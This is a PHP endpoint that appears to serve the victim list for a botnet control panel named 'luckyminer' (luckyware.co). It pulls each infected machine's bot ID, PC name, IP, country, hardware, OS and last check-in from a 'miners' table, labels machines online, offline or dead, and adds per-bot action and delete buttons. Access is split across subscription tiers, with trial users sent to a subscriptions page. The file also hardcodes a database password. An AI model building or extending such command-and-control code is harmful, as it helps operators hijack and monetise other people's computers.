<?php
session_start();

// Set content type to JSON
header('Content-Type: application/json');

// Validate session data
$role = $_SESSION['Role'] ?? '';
$username = $_SESSION['admin_name'] ?? '';
$secretkey = $_SESSION['secret_key'] ?? '';

/**
 * Validate string length
 */
function isStringLengthGreaterThan5($inputString) {
    return strlen($inputString) > 5;
}

/**
 * Enhanced input sanitization
 */
function sanitizeInput($input) {
    if (!is_string($input)) {
        return false;
    }
    
    // Define forbidden characters
    $forbiddenChars = ['(', ')', '=', '*', ';', '--', '/*', '*/', 'union', 'select', 'insert', 'update', 'delete', 'drop'];
    
    $input_lower = strtolower($input);
    
    // Check for forbidden characters and SQL keywords
    foreach ($forbiddenChars as $char) {
        if (strpos($input_lower, strtolower($char)) !== false) {
            return false;
        }
    }
    
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

/**
 * Validate user role and permissions
 */
function validateUserPermissions($role, $username, $secretkey) {
    if (empty($role) || empty($username) || empty($secretkey)) {
        return false;
    }
    
    $validRoles = ['Founder', 'Admin', 'Special', 'Premium', 'Trial', 'User'];
    return in_array($role, $validRoles);
}

/**
 * Create secure database connection
 */
function createDatabaseConnection() {
    $host = 'localhost';
    $dbname = 'luckyminer';
    $db_username = 'miner';
    $db_password = 'Sifre.12345';
    
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8mb4", $db_username, $db_password);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        return $pdo;
    } catch (PDOException $e) {
        error_log("Database connection failed: " . $e->getMessage());
        return false;
    }
}

// Main execution
try {
    // Validate session and permissions
    if (!validateUserPermissions($role, $username, $secretkey) || !isStringLengthGreaterThan5($secretkey)) {
        throw new Exception('Invalid session or insufficient permissions');
    }
    
    // Validate HTTP method
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('Invalid request method');
    }
    
    // Create database connection
    $pdo = createDatabaseConnection();
    if (!$pdo) {
        throw new Exception('Database connection failed');
    }
    
    // Validate and sanitize DataTables parameters
    $draw = filter_input(INPUT_POST, 'draw', FILTER_VALIDATE_INT);
    $start = filter_input(INPUT_POST, 'start', FILTER_VALIDATE_INT);
    $length = filter_input(INPUT_POST, 'length', FILTER_VALIDATE_INT);
    
    if ($draw === false || $start === false || $length === false) {
        throw new Exception('Invalid DataTables parameters');
    }
    
    // Limit length to prevent excessive data retrieval
    $length = min($length, 1000);
    
    // Get and validate search value
    $searchValue = '';
    if (isset($_POST['search']['value'])) {
        $rawSearchValue = $_POST['search']['value'];
        $sanitizedSearch = sanitizeInput($rawSearchValue);
        if ($sanitizedSearch !== false && strlen($sanitizedSearch) > 0) {
            $searchValue = $sanitizedSearch;
        }
    }
    
    // Define sortable columns (whitelist approach)
    $sortableColumns = [
        0 => 'PcName',
        1 => 'IP', 
        2 => 'Country',
        3 => 'Hardware',
        4 => 'OS',
        5 => 'LastPing',
        6 => 'BotID'
    ];
    
    // Validate sorting parameters
    $orderColumnIndex = filter_input(INPUT_POST, 'order', FILTER_DEFAULT, FILTER_REQUIRE_ARRAY);
    $orderColumn = 'BotID'; // Default sort column
    $orderDirection = 'DESC'; // Default sort direction
    
    if (is_array($orderColumnIndex) && isset($orderColumnIndex[0]['column']) && isset($orderColumnIndex[0]['dir'])) {
        $columnIndex = intval($orderColumnIndex[0]['column']);
        $direction = strtoupper($orderColumnIndex[0]['dir']);
        
        if (isset($sortableColumns[$columnIndex]) && in_array($direction, ['ASC', 'DESC'])) {
            $orderColumn = $sortableColumns[$columnIndex];
            $orderDirection = $direction;
        }
    }
    
    // Build base query with proper parameter binding
    $baseWhere = "WHERE 1 = 1";
    $params = [];
    
    // Role-based filtering
    if ($role === "Founder") {
        if ($username !== "Hopesar") {
            $baseWhere .= " AND PcName NOT LIKE :exclude_emre AND PcName NOT LIKE :exclude_eozer";
            $params['exclude_emre'] = '%emre%';
            $params['exclude_eozer'] = '%eozer%';
        }
    } else {
        $baseWhere .= " AND OwnerID = :owner_id";
        $params['owner_id'] = $secretkey;
    }
    
    // Add search conditions if search value exists
    $searchWhere = "";
    if (!empty($searchValue)) {
        $searchWhere = " AND (
            PcName LIKE :search1 OR
            OS LIKE :search2 OR
            Hardware LIKE :search3 OR
            HWID LIKE :search4 OR
            Country LIKE :search5 OR
            IP LIKE :search6
        )";
        $searchPattern = '%' . $searchValue . '%';
        $params['search1'] = $searchPattern;
        $params['search2'] = $searchPattern;
        $params['search3'] = $searchPattern;
        $params['search4'] = $searchPattern;
        $params['search5'] = $searchPattern;
        $params['search6'] = $searchPattern;
    }
    
    // Build the main data query
    $dataQuery = "SELECT BotID, PcName, IP, Country, Hardware, OS, LastPing 
                  FROM miners 
                  $baseWhere $searchWhere 
                  ORDER BY $orderColumn $orderDirection 
                  LIMIT :start, :length";
    
    $stmt = $pdo->prepare($dataQuery);
    
    // Bind parameters
    foreach ($params as $key => $value) {
        $stmt->bindValue(":$key", $value, PDO::PARAM_STR);
    }
    $stmt->bindValue(':start', $start, PDO::PARAM_INT);
    $stmt->bindValue(':length', $length, PDO::PARAM_INT);
    
    $stmt->execute();
    $results = $stmt->fetchAll();
    
    // Process results
    $data = [];
    $currentTime = time();
    
    foreach ($results as $row) {
        // Generate secure buttons HTML
        $botId = intval($row['BotID']);
        $buttonsHtml = generateButtonsHtml($botId, $role);
        
        // Calculate status based on last ping
        $status = calculateStatus($currentTime, $row['LastPing']);
        
        $data[] = [
            htmlspecialchars($row['PcName'], ENT_QUOTES, 'UTF-8'),
            htmlspecialchars($row['IP'], ENT_QUOTES, 'UTF-8'),
            htmlspecialchars($row['Country'], ENT_QUOTES, 'UTF-8'),
            htmlspecialchars($row['Hardware'], ENT_QUOTES, 'UTF-8'),
            htmlspecialchars($row['OS'], ENT_QUOTES, 'UTF-8'),
            $status,
            $buttonsHtml
        ];
    }
    
    // Get total count
    $countQuery = "SELECT COUNT(*) as total FROM miners $baseWhere $searchWhere";
    $countStmt = $pdo->prepare($countQuery);
    
    // Bind the same parameters for count query (excluding LIMIT params)
    foreach ($params as $key => $value) {
        $countStmt->bindValue(":$key", $value, PDO::PARAM_STR);
    }
    
    $countStmt->execute();
    $totalRecords = $countStmt->fetch()['total'];
    
    // Prepare response
    $response = [
        'draw' => $draw,
        'recordsTotal' => intval($totalRecords),
        'recordsFiltered' => intval($totalRecords),
        'data' => $data
    ];
    
    echo json_encode($response, JSON_UNESCAPED_UNICODE);
    
} catch (Exception $e) {
    // Log error and return generic error response
    error_log("DataTables Error: " . $e->getMessage());
    
    http_response_code(500);
    echo json_encode([
        'draw' => $draw ?? 0,
        'recordsTotal' => 0,
        'recordsFiltered' => 0,
        'data' => [],
        'error' => 'An error occurred while processing your request'
    ]);
}

/**
 * Generate secure buttons HTML
 */
function generateButtonsHtml($botId, $role) {
    $botId = intval($botId); // Ensure integer
    
    $actionButton = ($role === 'Trial') 
        ? 'onclick="window.location.href=\'https://luckyware.co/Subscriptions/\'"'
        : 'onclick="openActions(' . $botId . ')"';
    
    return '
        <div class="pt-2">
            <button class="bg px-4 py-1 rounded text-stone-400 btn2 mr-1" onclick="infoModalOpen(' . $botId . '), modalStart()">
                <i class="fa-solid fa-info icon2 miAuto text-sm"></i>
            </button>
            <button class="bg px-4 py-1 rounded text-stone-400 btn2 mr-1" ' . $actionButton . '>
                <i class="fa-solid fa-play icon2 miAuto text-sm"></i>
            </button>
            <button class="bgCol px-4 py-1 rounded text-stone-300" onclick="deleteRecord(' . $botId . ')">
                <i class="fa-solid fa-trash miAuto text-sm"></i>
            </button>
        </div>
    ';
}

/**
 * Calculate status based on last ping time
 */
function calculateStatus($currentTime, $lastPingTimestamp) {
    $timeDifference = $currentTime - intval($lastPingTimestamp);
    
    if ($timeDifference <= 250) {
        return '<span class="status-online-text">Online</span>';
    } elseif ($timeDifference <= 172800) {
        return '<span class="status-offline-text">Offline</span>';
    } else {
        return '<span class="status-dead-text">Dead</span>';
    }
}
?>